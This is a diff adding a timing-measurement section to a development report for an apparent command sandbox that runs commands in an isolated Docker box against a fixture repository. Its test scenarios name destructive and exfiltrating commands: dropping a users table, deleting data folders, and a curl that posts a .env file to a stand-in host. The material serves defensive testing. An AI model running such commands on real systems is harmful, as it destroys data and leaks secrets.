@@ -360,3 +360,105 @@ Measured after `corepack pnpm build` in `apps/ghost-shell` (Vite 7.3.8, sourcema
 | CSS | 8,269 bytes |
 
 `scripts/check-dist.mjs` reports `check-dist: ok`: no host outside the allowlist, no `node:` specifier, the wasm file is referenced from a JS file, and `_headers` is present.
+
+## Ghost runner timing measurement (task 15.2, 2026-11-18)
+
+Measured with `ghost-runner/scripts/measure-timing.mjs` (imports the built `dist/` of `@ghost-run/ghost-runner`; 5 measured runs per series after one discarded warm-up run; fresh box per run, no pool). Criteria are reported unchanged; this section only records values.
+
+### Machine and load
+
+| Item | Value |
+|---|---|
+| Chip | Apple M1 |
+| Cores (`hw.ncpu`) | 8 |
+| Memory (`hw.memsize`) | 17179869184 bytes (16 GiB) |
+| Docker Desktop | 4.94.0 (client 29.8.2 / server 29.8.2 / Docker Desktop 4.94.0 (241994)) |
+| Reference_Repo fixture | 3945 regular files (generated; `.env` canary, `app.db` with 1,206 users rows, 40 files each in `data/` and `build/`) |
+| Load at start (`sysctl -n vm.loadavg`) | { 3.98 9.49 12.27 } at 2026-11-18T09:34:35.354Z |
+| Load at end (`sysctl -n vm.loadavg`) | { 5.91 8.86 11.79 } at 2026-11-18T09:35:51.473Z |
+| Load wait before start | waited 330 s (11 polls) until the 1-minute load was below 4 |
+| Load at section start (1 min) | 3.98 |
+
+### Phase durations per scenario (seconds, Median_Of_5 / maximum)
+
+Budgets are those of requirement 19 criterion 1 (Median_Of_5 unless marked).
+
+| Phase | Budget (s) | S1 median / max | S2 median / max | S3 median / max | S4 median / max | S5 median / max |
+|---|---|---|---|---|---|---|
+| `dockerCheckMs` | 2.0 (absolute limit) | 0.032 / 0.035 | 0.035 / 0.038 | 0.035 / 0.038 | 0.034 / 0.041 | 0.037 / 0.038 |
+| `fingerprintBeforeMs` | 1.0 | 0.194 / 0.197 | 0.189 / 0.197 | 0.197 / 0.211 | 0.207 / 0.263 | 0.207 / 0.217 |
+| `copyMs` | 1.0 | 0.764 / 0.883 | 0.758 / 0.781 | 0.779 / 0.882 | 0.828 / 0.927 | 0.777 / 0.931 |
+| `baselineMs` | 0.8 | 0.098 / 0.111 | 0.097 / 0.110 | 0.097 / 0.130 | 0.108 / 0.118 | 0.098 / 0.108 |
+| `boxOverheadMs` | 0.8 (pool 0.65) | 0.151 / 0.159 | 0.143 / 0.149 | 0.151 / 0.165 | 0.152 / 0.210 | 0.152 / 0.156 |
+| `execMs` | <= exec limit (absolute limit) | 0.105 / 0.108 | 0.131 / 0.149 | 0.133 / 0.139 | 0.256 / 0.264 | 0.217 / 0.284 |
+| `diffMs` | 0.5 | 0.045 / 0.061 | 0.044 / 0.047 | 0.044 / 0.058 | 0.052 / 0.055 | 0.052 / 0.057 |
+| `sqliteMs` | 0.5 | 0.094 / 0.124 | 0.000 / 0.000 | 0.000 / 0.000 | 0.000 / 0.000 | 0.000 / 0.000 |
+| `fingerprintAfterMs` | 1.0 | 0.040 / 0.044 | 0.035 / 0.038 | 0.033 / 0.035 | 0.036 / 0.041 | 0.037 / 0.068 |
+| `cleanupMs` | 1.0 | 0.149 / 0.161 | 0.194 / 0.211 | 0.200 / 0.206 | 0.203 / 0.215 | 0.203 / 0.241 |
+| sum of phases except `execMs` | 8.6 (criterion 2) | 1.569 / 1.741 | 1.499 / 1.522 | 1.556 / 1.643 | 1.621 / 1.737 | 1.533 / 1.753 |
+| total, copy to Run_Result | 30 (S4: 3) | 1.344 / 1.522 | 1.285 / 1.348 | 1.363 / 1.479 | 1.524 / 1.649 | 1.436 / 1.640 |
+| total, `runPlan` wall clock | none | 1.572 / 1.750 | 1.515 / 1.571 | 1.604 / 1.706 | 1.800 / 1.909 | 1.662 / 1.894 |
+| load (1 min) after the series | none | 4.33 (HIGH, above 4) | 5.00 (HIGH, above 4) | 6.04 (HIGH, above 4) | 5.37 (HIGH, above 4) | 5.09 (HIGH, above 4) |
+
+Scenarios: S1 = `sqlite3 DROP TABLE users`; S2 = `delete ./data ./build`; S3 = `curl -d @.env https://setup-check.example`; S4 = `npm test`; S5 = `npm run clean`.
+Isolation modes seen: S1 docker-box (status ok, p6Claimed true); S2 docker-box (status ok, p6Claimed true); S3 docker-box (status ok, p6Claimed true); S4 docker-box (status ok, p6Claimed true); S5 docker-box (status ok, p6Claimed true).
+"total, copy to Run_Result" is `runPlan` wall time minus `dockerCheckMs` and `fingerprintBeforeMs` (the copy starts after both).
+
+Per-run samples (seconds), `execMs` and copy-to-return total:
+
+| Scenario | `execMs` samples | total samples |
+|---|---|---|
+| S1 | 0.103, 0.108, 0.098, 0.105, 0.107 | 1.423, 1.402, 1.439, 1.617, 1.592 |
+| S2 | 0.109, 0.131, 0.135, 0.149, 0.111 | 1.378, 1.343, 1.435, 1.433, 1.375 |
+| S3 | 0.133, 0.139, 0.136, 0.127, 0.132 | 1.549, 1.453, 1.436, 1.405, 1.447 |
+| S4 | 0.256, 0.261, 0.250, 0.252, 0.264 | 1.587, 1.738, 1.572, 1.674, 1.650 |
+| S5 | 0.212, 0.217, 0.213, 0.232, 0.284 | 1.606, 1.499, 1.520, 1.731, 1.511 |
+
+### Extra cost per step after the first (requirement 19 criterion 3, target at most 0.6 s)
+
+Plans of `true` steps (no file change), measured as `runPlan` wall time. Extra per step = (median of the 3-step plan minus median of the 1-step plan) / 2.
+
+| Plan | wall median / max (s) | `diffMs` median / max (s) | `execMs` median / max (s) | `sqliteMs` median / max (s) |
+|---|---|---|---|---|
+| 1 step | 1.592 / 1.658 | 0.041 / 0.042 | 0.093 / 0.110 | 0.000 / 0.000 |
+| 3 steps | 1.832 / 1.872 | 0.123 / 0.131 | 0.296 / 0.304 | 0.000 / 0.000 |
+
+Extra cost per step after the first: **0.120 s** (from medians), 0.140 s (3-step max minus 1-step median, divided by 2). From the step-dependent phases only (`execMs` + `diffMs` + `sqliteMs`, 3-step minus 1-step medians, divided by 2): 0.143 s. A negative wall-clock value means run-to-run noise exceeds the per-step cost. Target 0.6 s. Load after the series: 5.91 (HIGH, above 4).
+
+### Docker Desktop ctime propagation check
+
+For every case a host-side sentinel file is written (its ctime plays the role of `copiedAt`), then the box changes a file in the bind mount, and the host `ctime` (nanosecond `stat`) of that file is compared with the sentinel. The Differ relies on `ctime` being later than the baseline. 5 trials per case (after one discarded trial).
+
+| Case | Trials | ctime later at once | ctime later within 2 s | Smallest margin to sentinel (ms) | Longest wait (ms) |
+|---|---|---|---|---|---|
+| same-size overwrite | 5 | 5 | 5 | 32.8 | 0.0 |
+| chmod only | 5 | 5 | 5 | 74.2 | 0.0 |
+| new file | 5 | 5 | 5 | 113.6 | 0.0 |
+| touch (mtime/ctime only) | 5 | 5 | 5 | 153.0 | 0.0 |
+
+Result: ctime propagated and was later than the sentinel in every trial at once: **yes**; within 2 s: yes. Load after the check: 5.91 (HIGH, above 4).
+
+### Fake DNS lookup latency inside the box (requirement 8.1, target at most 0.1 s Median_Of_5)
+
+Hardened box with the recorder running (`ghost-init`, `--network none`, `--dns 127.0.0.1`); `node` `dns.lookup` of a distinct `.example` name, timed in-process (`process.hrtime`).
+
+| Measurement | Median (s) | Max (s) | Target (s) | Met |
+|---|---|---|---|---|
+| 5 lookups, one process each | 0.004 | 0.004 | 0.1 | yes |
+| 50 lookups in one process | 0.000 | 0.004 | 0.1 | yes |
+
+Samples (ms): 4.01, 3.52, 3.72, 4.28, 4.23. Answers: 127.0.1.1, 127.0.1.2, 127.0.1.3, 127.0.1.4, 127.0.1.5. No lookup waited for the 5 s resolver timeout: yes. Load after the check: 5.91 (HIGH, above 4).
+
+### `npm test` in the box (requirement 8.2, target below 1.0 s Median_Of_5)
+
+Wall time of `docker exec ... sh -c "npm test"` on the host in a warm box with the recorder running (includes the `docker exec` overhead; the box is already started). The fixture script is `node -e "console.log('ok')"`.
+
+| Measurement | Median (s) | Max (s) | Target (s) | Met |
+|---|---|---|---|---|
+| `npm test` via `docker exec` | 0.191 | 0.199 | 1 | yes |
+| `execMs` of scenario 4 (strace on, in `runPlan`) | 0.256 | 0.264 | 1 | yes |
+| scenario 4 total, copy to Run_Result | 1.524 | 1.649 | 3 (req 18.4) | yes |
+
+Samples of the `docker exec` series (s): 0.192, 0.182, 0.180, 0.191, 0.199. Load after the check: 5.91 (HIGH, above 4).
+
+Note on the timing measurement above: an earlier complete run of the same script (started at load 3.74) was discarded because Spotlight indexing and other host processes drove the 1-minute load to about 40 during the run (S3 to S5 `copyMs` up to 2.4 s, `fingerprintBeforeMs` up to 3.6 s, a negative wall-clock extra cost per step). The script now places the fixture beside a `.metadata_never_index` marker and waits for load below 4 before starting. The reported run started at load 3.98 and the 1-minute load rose to 4.3 to 6.0 while it ran (see the per-series load row), so values are close to, but not strictly under, the "load below about 4" condition.
